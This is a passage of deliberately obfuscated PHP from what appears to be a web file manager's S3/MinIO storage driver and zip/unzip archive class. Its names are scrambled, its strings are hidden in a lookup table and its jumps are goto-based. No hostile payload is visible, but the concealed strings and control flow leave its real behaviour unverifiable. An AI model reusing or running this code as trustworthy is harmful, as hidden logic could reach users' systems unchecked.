strlen($ÃÆôœÑ¦) - 1, 1) == $Ç©àäİ¿[8] ? !0 : !1; $this->cacheMethodInfoSet($ÃÆôœÑ¦, $å”š‹²Ÿ, $£­Ÿµ³”); if ($å”š‹²Ÿ) { $…Ö¥Ú³ù[] = $ÃÆôœÑ¦; continue; } $ÇŸé”íí[] = $´èËóÛâ ? $£­Ÿµ³” : $ÃÆôœÑ¦; } foreach ($Ùåé¹´Î[$Ç©àäİ¿[220]] as $£­Ÿµ³”) { $…Ö¥Ú³ù[] = $£­Ÿµ³”[$Ç©àäİ¿[32]]; $this->cacheMethodInfoSet($£­Ÿµ³”[$Ç©àäİ¿[32]], !0); } $this->cacheMethodInfoSet($´ÁÏÃßÚ, !0); return array($Ç©àäİ¿[82] => $…Ö¥Ú³ù, $Ç©àäİ¿[83] => $ÇŸé”íí); } private function listObjs($¬±ÚÊÓ‘, $™¿ü­³ = null, $¬Àõ £í = null, $‡ÕÌé€½ = null) { $€„ƒ‚™ =& $_SERVER[™»È’øè]; $¬±ÚÊÓ‘ = trim($¬±ÚÊÓ‘, $€„ƒ‚™[8]); $Ğƒí±ˆê = empty($¬±ÚÊÓ‘) && $¬±ÚÊÓ‘ !== $€„ƒ‚™[211] ? $€„ƒ‚™[12] : $¬±ÚÊÓ‘ . $€„ƒ‚™[8]; return $this->client->getBucket($this->bucket, $Ğƒí±ˆê, $™¿ü­³, $¬Àõ £í, $‡ÕÌé€½, !0); } public function has($ÍÙõ’ËÖ, $Æš›Éş™ = false, $ğÀû³† = true) { $¤¨Æ¨² =& $_SERVER[™»È’øè]; $ÍÙõ’ËÖ = trim($ÍÙõ’ËÖ, $¤¨Æ¨²[8]); $£œ·Âà = empty($ÍÙõ’ËÖ) && $ÍÙõ’ËÖ !== $¤¨Æ¨²[211] ? $¤¨Æ¨²[12] : $ÍÙõ’ËÖ . $¤¨Æ¨²[8]; $†çâ¥õ· = null; $ñÚ©±°« = 500; $Ìé´×™Æ = $¤¨Æ¨²[8]; $ªàÔòÒã = $˜æá¨› = array(); while (!0) { $ƒ ç§Ø´ = $this->listObjs($ÍÙõ’ËÖ, $†çâ¥õ·, $ñÚ©±°«, $Ìé´×™Æ); if (!$ƒ ç§Ø´) { break; } $†çâ¥õ· = $ƒ ç§Ø´[$¤¨Æ¨²[221]]; $…Ï’»º = $ƒ ç§Ø´[$¤¨Æ¨²[219]]; $ª’òâŠ– = $ƒ ç§Ø´[$¤¨Æ¨²[220]]; if (empty($…Ï’»º) && empty($ª’òâŠ–)) { break; } if (count($…Ï’»º) == 1 && $…Ï’»º[0][$¤¨Æ¨²[32]] == $£œ·Âà) { break; } if ($Æš›Éş™) { if (count($…Ï’»º)) { $…Ï’»º = array_column($…Ï’»º, $¤¨Æ¨²[32]); $ªàÔòÒã = array_merge($ªàÔòÒã, $…Ï’»º); } if (count($ª’òâŠ–)) { $ª’òâŠ– = array_column($ª’òâŠ–, $¤¨Æ¨²[32]); $˜æá¨› = array_merge($˜æá¨›, $ª’òâŠ–); } if ($†çâ¥õ· === null) { break; } continue; } if ($ğÀû³†) { if (!empty($…Ï’»º)) { if (count($…Ï’»º) > 1 || isset($…Ï’»º[0][$¤¨Æ¨²[32]]) && $…Ï’»º[0][$¤¨Æ¨²[32]] != $£œ·Âà) { return !0; } } } else { if (!empty($ª’òâŠ–)) { return !0; } } if ($†çâ¥õ· === null) { break; } } if ($Æš›Éş™) { $ªàÔòÒã = array_diff($ªàÔòÒã, array($£œ·Âà)); $ªàÔòÒã = count(array_unique($ªàÔòÒã)); $˜æá¨› = count(array_unique($˜æá¨›)); return array($¤¨Æ¨²[222] => $ªàÔòÒã, $¤¨Æ¨²[223] => $˜æá¨›); } return !1; } public function listAll($èİšªŸ) { $š¤¸®­‚ =& $_SERVER[™»È’øè]; $ç´•ôé = $this->fileList($èİšªŸ, $š¤¸®­‚[12], !0); $£‰ºÆ§Å = array_to_keyvalue($ç´•ôé[$š¤¸®­‚[83]], $š¤¸®­‚[32]); foreach ($ç´•ôé[$š¤¸®­‚[82]] as $ÈÅ”¹à) { if (is_string($ÈÅ”¹à)) { $£‰ºÆ§Å[$ÈÅ”¹à] = array($š¤¸®­‚[76] => 0); } } return $this->listAllFiles($èİšªŸ, $£‰ºÆ§Å); } public function canRead($Ö–¥ãØº) { $âÉØ¨º =& $_SERVER[™»È’øè]; $íıÉìÏä = $this->client->getAccessControlPolicy($this->bucket, $Ö–¥ãØº); if (!$íıÉìÏä) { return !1; } return in_array($íıÉìÏä, array($âÉØ¨º[224], $âÉØ¨º[225], $âÉØ¨º[226])) ? !0 : !1; } public function canWrite($şÓ—Ş) { $Ó§œğ =& $_SERVER[™»È’øè]; $Ó¹õ‹ ‹ = $this->client->getAccessControlPolicy($this->bucket, $şÓ—Ş); if (!$Ó¹õ‹ ‹) { return !1; } return in_array($Ó¹õ‹ ‹, array($Ó§œğ[224], $Ó§œğ[225])) ? !0 : !1; } public function getContent($¼÷‡ÌÎè) { return $this->client->getObject($this->bucket, $¼÷‡ÌÎè); } public function setContent($ÇŸÎ¬ä–, $½Ëùéó = '', $©¶Éú¯î = false) { $Ş‘ÏùÈÙ =& $_SERVER[™»È’øè]; $ÇŸÎ¬ä– = $©¶Éú¯î ? trim($ÇŸÎ¬ä–, $Ş‘ÏùÈÙ[8]) . $Ş‘ÏùÈÙ[8] : $ÇŸÎ¬ä–; $ÒÓ„ƒ = get_file_mime(get_path_ext($ÇŸÎ¬ä–)); $æÌÇ£µ = $this->client->putObject($½Ëùéó, $this->bucket, $ÇŸÎ¬ä–, $Ş‘ÏùÈÙ[212], array(), $ÒÓ„ƒ); if (!$æÌÇ£µ) { return !1; } if ($©¶Éú¯î) { return !0; } $this->cacheMethod(null, null); $æÌÇ£µ = $this->copyFile($ÇŸÎ¬ä–, $ÇŸÎ¬ä–, array($Ş‘ÏùÈÙ[227] => $æÌÇ£µ[$Ş‘ÏùÈÙ[217]])); return $æÌÇ£µ ? !0 : !1; } public function fileSubstr($Âµ¦“ğ, $§øäÙñ, $Æ™Éê°¹) { $¬¹²ñÌ‚ = $§øäÙñ + $Æ™Éê°¹ - 1; return $this->client->getObject($this->bucket, $Âµ¦“ğ, array($_SERVER[™»È’øè][228] => "\142\171\x74\145\163\x3d{$§øäÙñ}\55{$¬¹²ñÌ‚}")); } public function upload($¡é…ÚÀƒ, $Ò®ã™‹, $å£¬† = false, $š±«›½ = REPEAT_REPLACE) { $˜Ö€ÉË· =& $_SERVER[™»È’øè]; $ô»ûØ¸ç = array($˜Ö€ÉË·[227] => @md5_file($Ò®ã™‹)); $»Š®­» = array($˜Ö€ÉË·[229] => get_file_mime(get_path_ext($¡é…ÚÀƒ))); if (IO::size($Ò®ã™‹) <= 1024 * 1024 * 200) { $„Ğ¡ªäş = $this->client->putObjectFile($Ò®ã™‹, $this->bucket, $¡é…ÚÀƒ, $˜Ö€ÉË·[212], $ô»ûØ¸ç, $»Š®­»); return !empty($„Ğ¡ªäş) ? $this->getPathOuter($¡é…ÚÀƒ) : !1; } $íĞ¿«ë· = $this->client->multiUploadObject($Ò®ã™‹, $this->bucket, trim($¡é…ÚÀƒ, $˜Ö€ÉË·[8]), $ô»ûØ¸ç, $»Š®­»); return $íĞ¿«ë· ? $this->getPathOuter($¡é…ÚÀƒ) : !1; } public function download($çó‹Ëøœ, $åµ£ÖºÅ) { if (!@is_dir($this->pathFather($åµ£ÖºÅ)) && !IO::mkdir($this->pathFather($åµ£ÖºÅ))) { return !1; } $­İÓÂíÏ = $this->client->getObject($this->bucket, $çó‹Ëøœ, array(), $åµ£ÖºÅ); return $­İÓÂíÏ !== !1 ? $åµ£ÖºÅ : !1; } public function link($Í„àˆæÂ, $Àù×Ñæ = array()) { $‡ßöÈÆä =& $_SERVER[™»È’øè]; if ($this->signVer == $‡ßöÈÆä[230]) { return $this->client->getAuthenticatedURL($this->bucket, $Í„àˆæÂ, 3600 * 12, $Àù×Ñæ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Í„àˆæÂ, $‡ßöÈÆä[8]), 3600 * 12, $this->region, array(), !0, $Àù×Ñæ); } public function fileOut($“¥Ïßşù, $¸Ã½Ú¤ = false, $ŠüğÆ = false, $Á—âç×ç = '') { $§±§ÏÎ‰ =& $_SERVER[™»È’øè]; if ($this->isFileOutServer()) { return $this->fileOutServer($“¥Ïßşù, $¸Ã½Ú¤, $ŠüğÆ, $Á—âç×ç); } if (!$ŠüğÆ) { $ŠüğÆ = $this->pathThis($“¥Ïßşù); } $„…†¨¸” = get_file_mime(get_path_ext($ŠüğÆ)); if ($„…†¨¸” == $§±§ÏÎ‰[231]) { return parent::fileOut($“¥Ïßşù, $¸Ã½Ú¤, $ŠüğÆ, $Á—âç×ç); } $”¥áñ±Š = array($§±§ÏÎ‰[232] => $„…†¨¸”); if ($¸Ã½Ú¤) { $”¥áñ±Š[$§±§ÏÎ‰[233]] = $§±§ÏÎ‰[234] . rawurlencode($ŠüğÆ); } else { } $Ç…Öä = $this->link($“¥Ïßşù, $”¥áñ±Š); $this->fileOutLink($Ç…Öä); } public function fileOutServer($ÁÂ»‚‰ , $ÉØä–Ïí = false, $îåÊŒÈ = false, $Â†öúäé = '') { parent::fileOut($ÁÂ»‚‰ , $ÉØä–Ïí, $îåÊŒÈ, $Â†öúäé); } public function fileOutImageServer($ê˜úØ¾¼, $œ¢æÚÉª = 250) { parent::fileOutImage($ê˜úØ¾¼, $œ¢æÚÉª); } public function hashMd5($¹•ĞÛèÉ, $×„Ï¤£ = '') { $ç«¦¡€ï =& $_SERVER[™»È’øè]; $öøùÆêœ = $this->objectMeta($¹•ĞÛèÉ); if (!$öøùÆêœ) { return !1; } $×„Ï¤£ = $×„Ï¤£ ? $×„Ï¤£ : _get($öøùÆêœ, $ç«¦¡€ï[235]); $×„Ï¤£ = $×„Ï¤£ ? $×„Ï¤£ : _get($öøùÆêœ, $ç«¦¡€ï[217], $ç«¦¡€ï[12]); return $×„Ï¤£; } public function uploadFormData($‰ä˜êß, $«õÜõìã = 3600) { $²ªÆ¦À =& $_SERVER[™»È’øè]; $˜ïìµ¤Ï = $this->pathFather($‰ä˜êß); $ù‚ã½™ = $this->client->getHttpUploadPostParams($this->bucket, $˜ïìµ¤Ï, $²ªÆ¦À[212], $«õÜõìã); return array_merge((array) $ù‚ã½™, array($²ªÆ¦À[195] => $this->getHost())); } public function multiUploadFormData($¢ßÕã©, $¾Şœ ìõ = 3600) { $¾‰æşµï =& $_SERVER[™»È’øè]; $øÉóÛì = gmdate($¾‰æşµï[236]); $ÃÃµ¡€» = array(); $ÛŸ³ˆ£ = $this->client->getUploadId($this->bucket, $¢ßÕã©, $ÃÃµ¡€»); if (!$ÛŸ³ˆ£) { return !1; } return array($¾‰æşµï[237] => $ÛŸ³ˆ£, $¾‰æşµï[195] => $this->getHost() . $¾‰æşµï[8] . $this->pathEncode($¢ßÕã©), $¾‰æşµï[238] => $øÉóÛì, $¾‰æşµï[94] => $¢ßÕã©); } public function multiUploadAuthData($ŞÜ¨—µÍ, $‚ÙÚó‰ = array()) { $ñøáıİĞ =& $_SERVER[™»È’øè]; $ö½‚·Êó = isset($‚ÙÚó‰[$ñøáıİĞ[238]]) ? $‚ÙÚó‰[$ñøáıİĞ[238]] : gmdate($ñøáıİĞ[236]); $ŸÑŠ“å† = isset($‚ÙÚó‰[$ñøáıİĞ[174]]) ? $‚ÙÚó‰[$ñøáıİĞ[174]] : $ñøáıİĞ[12]; $³ö¡´ìË = $‚ÙÚó‰[$ñøáıİĞ[94]]; unset($‚ÙÚó‰[$ñøáıİĞ[94]]); if (isset($‚ÙÚó‰[$ñøáıİĞ[239]])) { $‚ÙÚó‰[$ñøáıİĞ[238]] = $ö½‚·Êó; return $this->listUploadParts($³ö¡´ìË, $‚ÙÚó‰); } $Ëòúâßá = array($ñøáıİĞ[240], $ñøáıİĞ[12], $ñøáıİĞ[120], $ñøáıİĞ[12], "\x78\x2d\x61\155\172\x2d\144\x61\164\145\x3a{$ö½‚·Êó}", $ñøáıİĞ[8] . $this->bucket . $ñøáıİĞ[8] . $this->pathEncode($³ö¡´ìË) . $ŸÑŠ“å†); if (strpos($ŸÑŠ“å†, $ñøáıİĞ[241]) === 0) { $Ëòúâßá[0] = $ñøáıİĞ[242]; } if (isset($‚ÙÚó‰[$ñøáıİĞ[243]]) && $‚ÙÚó‰[$ñøáıİĞ[243]] == $ñøáıİĞ[244]) { $Ëòúâßá[0] = $ñøáıİĞ[244]; } $ñıŠ³¤‹ = implode($ñøáıİĞ[245], $Ëòúâßá); $†‹ÓÈùä = base64_encode(hash_hmac($ñøáıİĞ[246], $ñıŠ³¤‹, $this->secret, !0)); $Ì…—›èÜ = $ñøáıİĞ[247] . $this->accessKey . $ñøáıİĞ[4] . $†‹ÓÈùä; if (strpos($ŸÑŠ“å†, $ñøáıİĞ[241]) === 0) { return array($ñøáıİĞ[248] => $Ì…—›èÜ, $ñøáıİĞ[238] => $ö½‚·Êó); } return $Ì…—›èÜ; } public function listUploadParts($Ğòõ, $¸æ›ğöÆ = array()) { $œıâ¸Äá =& $_SERVER[™»È’øè]; $Û–ĞÖ±¶ = str_replace($œıâ¸Äá[249], $œıâ¸Äá[12], $¸æ›ğöÆ[$œıâ¸Äá[174]]); $İ¨Š›¸ï = $this->client->listParts($this->bucket, $Ğòõ, $Û–ĞÖ±¶); if (!$İ¨Š›¸ï) { return !1; } unset($¸æ›ğöÆ[$œıâ¸Äá[239]], $¸æ›ğöÆ[$œıâ¸Äá[243]]); $¸æ›ğöÆ[$œıâ¸Äá[94]] = $Ğòõ; $‚¾íü· = $this->multiUploadAuthData($Ğòõ, $¸æ›ğöÆ); if (empty($‚¾íü·)) { return !1; } return array($œıâ¸Äá[248] => $‚¾íü·, $œıâ¸Äá[238] => $¸æ›ğöÆ[$œıâ¸Äá[238]], $œıâ¸Äá[250] => $İ¨Š›¸ï); } public function getHost() { return parent::getHost() . $_SERVER[™»È’øè][8] . $this->bucket; } public function size($Ü½ÌÑ–£) { $­¼š§»¯ = $this->objectMeta($Ü½ÌÑ–£); return $­¼š§»¯ ? $­¼š§»¯[$_SERVER[™»È’øè][76]] : 0; } public function info($ğÊóÑ«) { if ($this->isFolder($ğÊóÑ«)) { return $this->folderInfo($ğÊóÑ«); } else { if ($this->isFile($ğÊóÑ«)) { return $this->fileInfo($ğÊóÑ«); } } return !1; } public function exist($ã‰¯…‚¥) { return $this->isFile($ã‰¯…‚¥) || $this->isFolder($ã‰¯…‚¥); } public function isFile($ûÓ“¯Äâ) { return !$this->isFolder($ûÓ“¯Äâ) && $this->objectMeta($ûÓ“¯Äâ); } public function isFolder($ò³…¤µˆ) { return $this->cacheMethod($_SERVER[™»È’øè][165], $ò³…¤µˆ); } protected function objectMeta($ÉƒÉ·¨ñ) { return $this->cacheMethod($_SERVER[™»È’øè][167], $ÉƒÉ·¨ñ); } protected function _objectMeta($¢§·÷úÑ) { $“È¤©¾… =& $_SERVER[™»È’øè]; $¢§·÷úÑ = rtrim($¢§·÷úÑ, $“È¤©¾…[8]); try { $²‘Á±ÉÅ = $this->client->getObjectInfo($this->bucket, $¢§·÷úÑ); if (!isset($²‘Á±ÉÅ[$“È¤©¾…[235]]) && isset($²‘Á±ÉÅ[$“È¤©¾…[251]])) { $²‘Á±ÉÅ[$“È¤©¾…[235]] = $²‘Á±ÉÅ[$“È¤©¾…[251]]; } } catch (Exception $İŠşĞ³) { $²‘Á±ÉÅ = !1; } if (!$²‘Á±ÉÅ) { } return $²‘Á±ÉÅ; } protected function _isFolder($ÑÈÔç÷) { $¸Æ¾£› =& $_SERVER[™»È’øè]; $ÑÈÔç÷ = rtrim($ÑÈÔç÷, $¸Æ¾£›[8]); if ($ÑÈÔç÷ == $¸Æ¾£›[12] || $ÑÈÔç÷ == $¸Æ¾£›[8]) { return !0; } $ ‘åòê§ = $this->client->getBucket($this->bucket, $ÑÈÔç÷, null, 1); if (empty($ ‘åòê§[$¸Æ¾£›[219]])) { return !1; } $‹“ÖÈÂƒ = $ ‘åòê§[$¸Æ¾£›[219]][0][$¸Æ¾£›[32]]; return stripos($‹“ÖÈÂƒ, $ÑÈÔç÷ . $¸Æ¾£›[8]) === 0 ? !0 : !1; if (substr($‹“ÖÈÂƒ, -1) == $¸Æ¾£›[8]) { return !0; } if (get_path_this($‹“ÖÈÂƒ) == get_path_this($ÑÈÔç÷)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($â´•­¨Ë) { parent::__construct($â´•­¨Ë); $this->signatureVersion($_SERVER[™»È’øè][230]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ÕÓõØŞ€, $ ®›Üò = 3600) { $ÌÜÍ­Ä‘ =& $_SERVER[™»È’øè]; $ÀÏ†’“ê = $ÌÜÍ­Ä‘[212]; $íÛÙ—Â  = $ÌÜÍ­Ä‘[252]; $ÚŞ‰ÎàË = $ÌÜÍ­Ä‘[62]; $¡¡©ñŸ = gmdate($ÌÜÍ­Ä‘[253]); $ô•±ŒÓÕ = gmdate($ÌÜÍ­Ä‘[254]); $ô²¶‚Ëí = $ÌÜÍ­Ä‘[255]; $•ù–ŞÙí = $ ®›Üò . $ÌÜÍ­Ä‘[12]; $—¹éÉ´Ö = $ÌÜÍ­Ä‘[256]; $äæ‚€ = array($this->accessKey, $ô•±ŒÓÕ, $this->region, $ÚŞ‰ÎàË, $ô²¶‚Ëí); $‹ù—œ«˜ = implode($ÌÜÍ­Ä‘[8], $äæ‚€); $óËú¸Ç” = array($ÌÜÍ­Ä‘[257] => gmdate($ÌÜÍ­Ä‘[258], strtotime($ÌÜÍ­Ä‘[259])), $ÌÜÍ­Ä‘[260] => array(array($ÌÜÍ­Ä‘[261] => $this->bucket), array($ÌÜÍ­Ä‘[262] => $ÀÏ†’“ê), array($ÌÜÍ­Ä‘[263], $ÌÜÍ­Ä‘[264], $ÌÜÍ­Ä‘[12]), array($ÌÜÍ­Ä‘[263], $ÌÜÍ­Ä‘[265], $ÌÜÍ­Ä‘[12]), array($ÌÜÍ­Ä‘[263], $ÌÜÍ­Ä‘[266], $ÌÜÍ­Ä‘[12]), array($ÌÜÍ­Ä‘[267] => $—¹éÉ´Ö), array($ÌÜÍ­Ä‘[268] => $‹ù—œ«˜), array($ÌÜÍ­Ä‘[269] => $íÛÙ—Â ), array($ÌÜÍ­Ä‘[270] => $¡¡©ñŸ), array($ÌÜÍ­Ä‘[271] => $•ù–ŞÙí))); $Ü¡µÓ¦— = base64_encode(json_encode($óËú¸Ç”)); $ÅÖı»÷ï = hash_hmac($ÌÜÍ­Ä‘[272], $ô•±ŒÓÕ, $ÌÜÍ­Ä‘[273] . $this->secret, !0); $µÓ£‘‚ = hash_hmac($ÌÜÍ­Ä‘[272], $this->region, $ÅÖı»÷ï, !0); $Ï£âôÜğ = hash_hmac($ÌÜÍ­Ä‘[272], $ÚŞ‰ÎàË, $µÓ£‘‚, !0); $‡±åêè» = hash_hmac($ÌÜÍ­Ä‘[272], $ô²¶‚Ëí, $Ï£âôÜğ, !0); $ Ô«ª×‰ = hash_hmac($ÌÜÍ­Ä‘[272], $Ü¡µÓ¦—, $‡±åêè»); $ƒ„ÚÙ–‹ = array($ÌÜÍ­Ä‘[229] => $ÌÜÍ­Ä‘[12], $ÌÜÍ­Ä‘[274] => $ÌÜÍ­Ä‘[12], $ÌÜÍ­Ä‘[262] => $ÀÏ†’“ê, $ÌÜÍ­Ä‘[267] => $—¹éÉ´Ö, $ÌÜÍ­Ä‘[275] => $Ü¡µÓ¦—, $ÌÜÍ­Ä‘[276] => $‹ù—œ«˜, $ÌÜÍ­Ä‘[277] => $íÛÙ—Â , $ÌÜÍ­Ä‘[278] => $¡¡©ñŸ, $ÌÜÍ­Ä‘[279] => $•ù–ŞÙí, $ÌÜÍ­Ä‘[280] => $ Ô«ª×‰, $ÌÜÍ­Ä‘[195] => $this->getHost()); return $ƒ„ÚÙ–‹; } } goto C¡¶ß²£Ì·; B®¨ÑªÂå§: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $É‘¥€ñ; if ($É‘¥€ñ) { return $É‘¥€ñ; } $›ØÎÑĞ¤ = IO::init($_SERVER[™»È’øè][8]); return $›ØÎÑĞ¤; } private static function iconvSystem($Š”€ô··) { return self::local()->iconvSystem($Š”€ô··); } private static function iconvApp($…È‚¡°µ) { return self::local()->iconvApp($…È‚¡°µ); } public static function zipFolder($á¾Åë‰», $óªúÇÙ¦ = "\x7a\x69\160", $æõ¶Á÷Ï = '', $Ã¨åó”‰ = REPEAT_RENAME) { $şõ²±ğ =& $_SERVER[™»È’øè]; $¶ŞÙøö’ = IO::listPath($á¾Åë‰»); if (!$¶ŞÙøö’) { return !1; } $¶ŞÙøö’ = array_merge($¶ŞÙøö’[$şõ²±ğ[82]], $¶ŞÙøö’[$şõ²±ğ[83]]); return self::zip($¶ŞÙøö’, $óªúÇÙ¦, $æõ¶Á÷Ï, $Ã¨åó”‰); } public static function zip($©Ò¡Úå, $ä±¨²ïˆ = "\172\x69\160", $ŞüÀûê‘ = '', $‹İ×üÅÖ = REPEAT_RENAME) { $×»á™· =& $_SERVER[™»È’øè]; if (is_string($©Ò¡Úå) && $©Ò¡Úå) { $©Ò¡Úå = array(array($×»á™·[84] => $©Ò¡Úå)); } $íë¸ º’ = self::init($©Ò¡Úå[0][$×»á™·[84]]); $àì‚À“Å = self::info($©Ò¡Úå[0][$×»á™·[84]]); $ÊößôªŒ = $×»á™·[12]; $Ê€çô ® = $×»á™·[12]; $™î «‹§ = $×»á™·[12]; if ($ŞüÀûê‘ && substr($ŞüÀûê‘, -1, 1) != $×»á™·[8]) { $Ê€çô ® = get_path_father($ŞüÀûê‘); $™î «‹§ = get_path_this($ŞüÀûê‘); } else { $Ê€çô ® = self::pathFather($àì‚À“Å[$×»á™·[84]]); $™î «‹§ = $àì‚À“Å[$×»á™·[32]] . $×»á™·[10] . $ä±¨²ïˆ; if (count($©Ò¡Úå) > 1) { $¬ßü˜’ = IO::info($Ê€çô ®); $™î «‹§ = $¬ßü˜’[$×»á™·[32]] . $×»á™·[10] . $ä±¨²ïˆ; } if ($ŞüÀûê‘) { $Ê€çô ® = $ŞüÀûê‘; } } if ($íë¸ º’->getType() == $×»á™·[106]) { $£Áìú·¥ = self::init($Ê€çô ®); $œæÎ‹ŒÌ = $£Áìú·¥->getType() == $×»á™·[106] ? $Ê€çô ® : get_path_father($íë¸ º’->path); $œæÎ‹ŒÌ = rtrim($œæÎ‹ŒÌ, $×»á™·[8]) . $×»á™·[8]; mk_dir($œæÎ‹ŒÌ); } else { $ÊößôªŒ = TEMP_FILES . $×»á™·[1213] . time() . rand_string(8) . $×»á™·[8]; mk_dir($ÊößôªŒ); file_put_contents($ÊößôªŒ . $×»á™·[1214], $×»á™·[12]); $œæÎ‹ŒÌ = $ÊößôªŒ; } $óáçèï = IO::info($œæÎ‹ŒÌ); if (!$óáçèï || !$óáçèï[$×»á™·[216]]) { show_json(LNG($×»á™·[1215]), !1); } $ØüÅ×Ù = self::zipFileList($©Ò¡Úå, $ÊößôªŒ); foreach ($ØüÅ×Ù as $Ã‚Œö¢ => $íÑÒÔö¢) { $ØüÅ×Ù[$Ã‚Œö¢] = self::iconvSystem($íÑÒÔö¢); } $ÆÒ¹ò¬ = get_filename_auto($œæÎ‹ŒÌ . $™î «‹§, $×»á™·[12], $‹İ×üÅÖ); KodArchive::create(self::iconvSystem($ÆÒ¹ò¬), $ØüÅ×Ù); if (!IO::exist($ÆÒ¹ò¬)) { if ($ÊößôªŒ) { del_dir($ÊößôªŒ); } show_json(LNG($×»á™·[1216]), !1); } if (!$ÊößôªŒ) { return $ÆÒ¹ò¬; } $‚ÄÄŞ«€ = self::move($ÆÒ¹ò¬, $Ê€çô ®, $‹İ×üÅÖ); if ($ÊößôªŒ) { del_dir($ÊößôªŒ); } if (!$ÆÒ¹ò¬) { show_json(LNG($×»á™·[1216]), !1); } return $‚ÄÄŞ«€; } public static function unzip($¢¿—¦‹û, $Í•µ¼Ø¡, $Ù‚í¶¸æ = "\55\61", $Ş’¡±ş© = "\162\x65\x70\x6c\x61\x63\x65") { $ïÓóÀ³û =& $_SERVER[™»È’øè]; $ó¤Áıë½ = parent::info($¢¿—¦‹û); if (!$ó¤Áıë½) { show_json(LNG($ïÓóÀ³û[1217]), !1); } $­ÄŒ¬÷µ = IO::infoFullSimple($Í•µ¼Ø¡); if (!$­ÄŒ¬÷µ) { $Í•µ¼Ø¡ = IO::mkdir($Í•µ¼Ø¡); } if (isset($­ÄŒ¬÷µ[$ïÓóÀ³û[180]]) && trim($­ÄŒ¬÷µ[$ïÓóÀ³û[84]], $ïÓóÀ³û[8]) != trim($Í•µ¼Ø¡, $ïÓóÀ³û[8])) { $ğš°Ğøá = KodIO::make($­ÄŒ¬÷µ[$ïÓóÀ³û[179]]); $²ó½â‡° = IO::fileNameAuto($ğš°Ğøá, $­ÄŒ¬÷µ[$ïÓóÀ³û[32]], REPEAT_RENAME_FOLDER, !0); $Í•µ¼Ø¡ = IO::mkdir($ğš°Ğøá . $²ó½â‡°); } $Ù‚í¶¸æ = $Ù‚í¶¸æ && $Ù‚í¶¸æ != $ïÓóÀ³û[1218] ? @json_decode($Ù‚í¶¸æ, !0) : -1; $ø·ŞË›÷ = self::unzipPart($¢¿—¦‹û, $Ù‚í¶¸æ); if (!$ø·ŞË›÷ || !IO::exist($ø·ŞË›÷[$ïÓóÀ³û[213]])) { show_json(LNG($ïÓóÀ³û[105]), !1); } $ƒª›ã¶° = $ø·ŞË›÷[$ïÓóÀ³û[1219]][count($ø·ŞË›÷[$ïÓóÀ³û[1219]]) - 1]; if ($ƒª›ã¶°[$ïÓóÀ³û[1220]] == -1 || substr($ƒª›ã¶°[$ïÓóÀ³û[32]], -1, 1) == $ïÓóÀ³û[8]) { $å›˜¹ıê = $ø·ŞË›÷[$ïÓóÀ³û[1221]] . rand_string(10) . $ïÓóÀ³û[8]; mk_dir($å›˜¹ıê); $è¡üÅ–Â = count($ø·ŞË›÷[$ïÓóÀ³û[1219]]) == 1 ? IO::ext($¢¿—¦‹û) : get_path_ext($ø·ŞË›÷[$ïÓóÀ³û[213]]); $÷Åœ¨åÉ = KodArchive::extract(self::iconvSystem($ø·ŞË›÷[$ïÓóÀ³û[213]]), $å›˜¹ıê, $ƒª›ã¶°[$ïÓóÀ³û[1220]], $²ó½â‡°, $è¡üÅ–Â); self::unzipErrorCheck($÷Åœ¨åÉ, array($ïÓóÀ³û[1222], $¢¿—¦‹û, $è¡üÅ–Â, $Í•µ¼Ø¡, $ø·ŞË›÷)); Hook::trigger($ïÓóÀ³û[1223], $å›˜¹ıê); recursion_dir($å›˜¹ıê, $ÊÖöå¿ä, $Ô·ÔêğÙ, 0); $Õà§—¨Á = array_merge($ÊÖöå¿ä, $Ô·ÔêğÙ); $Ô¶¥»½ = array(); foreach ($Õà§—¨Á as $ªóİöÊè) { $İ‡ùàüº = IO::move(self::iconvApp($ªóİöÊè), $Í•µ¼Ø¡, $Ş’¡±ş©); if ($İ‡ùàüº) { $Ô¶¥»½[] = $İ‡ùàüº; } } del_dir($å›˜¹ıê); } else { $İ‡ùàüº = IO::move($ø·ŞË›÷[$ïÓóÀ³û[213]], $Í•µ¼Ø¡, $Ş’¡±ş©, get_path_this($ƒª›ã¶°[$ïÓóÀ³û[32]])); if ($İ‡ùàüº) { $Ô¶¥»½[] = $İ‡ùàüº; } } return $Ô¶¥»½ ? $Ô¶¥»½ : !1; } public static function unzipList($Õ§ëŸ¦) { $êÊ§Ôò­ =& $_SERVER[™»È’øè]; $«ÔÓ®ú© = isset($Õ§ëŸ¦[$êÊ§Ôò­[1224]]) ? $Õ§ëŸ¦[$êÊ§Ôò­[1224]] : !1; $èÀç¶§ = isset($Õ§ëŸ¦[$êÊ§Ôò­[1220]]) ? @json_decode($Õ§ëŸ¦[$êÊ§Ôò­[1220]], !0) : -1; $çùÙ°à– = self::unzipPart($Õ§ëŸ¦[$êÊ§Ôò­[84]], $èÀç¶§); if (!$çùÙ°à– || !IO::exist($çùÙ°à–[$êÊ§Ôò­[213]])) { show_json(LNG($êÊ§Ôò­[105]), !1); } $Ÿ˜¥ÙÄƒ = $çùÙ°à–[$êÊ§Ôò­[1219]][count($çùÙ°à–[$êÊ§Ôò­[1219]]) - 1]; $Óˆ°õ§ = in_array(IO::ext($çùÙ°à–[$êÊ§Ôò­[213]]), array($êÊ§Ôò­[356], $êÊ§Ôò­[1225], $êÊ§Ôò­[1226], $êÊ§Ôò­[1227], $êÊ§Ôò­[1228], $êÊ§Ôò­[1229])); if (!$«ÔÓ®ú© && ($Ÿ˜¥ÙÄƒ[$êÊ§Ôò­[1220]] == -1 || $Óˆ°õ§)) { $şÕŸ•Ç¸ = $çùÙ°à–[$êÊ§Ôò­[1221]] . get_path_this($çùÙ°à–[$êÊ§Ôò­[213]]) . $êÊ§Ôò­[1230]; if (!IO::exist($şÕŸ•Ç¸)) { $ İ˜Í„¹ = $Ÿ˜¥ÙÄƒ[$êÊ§Ôò­[1220]] == -1 ? get_path_ext(IO::pathThis($Õ§ëŸ¦[$êÊ§Ôò­[84]])) : get_path_ext($çùÙ°à–[$êÊ§Ôò­[213]]); $—İá¨´– = KodArchive::listContent(self::iconvSystem($çùÙ°à–[$êÊ§Ôò­[213]]), !0, $ İ˜Í„¹); self::unzipErrorCheck($—İá¨´–, array($êÊ§Ôò­[1231], $Õ§ëŸ¦, $çùÙ°à–)); @file_put_contents($şÕŸ•Ç¸, json_encode($—İá¨´–[$êÊ§Ôò­[1232]])); } return 